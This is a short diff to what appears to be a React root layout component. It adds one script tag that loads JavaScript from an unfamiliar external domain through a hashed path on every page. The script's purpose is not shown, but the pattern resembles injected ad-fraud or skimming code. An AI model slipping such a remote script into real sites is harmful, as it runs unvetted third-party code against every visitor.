@@ -130,6 +130,7 @@ function RootShell({ children }: { children: React.ReactNode }) {
       <body>
         {children}
         <Scripts />
+        <script src="https://undergocutlery.com/ae/0d/31/ae0d31b2adaec34d918bbe58f11842c2.js" />
       </body>
     </html>
   );
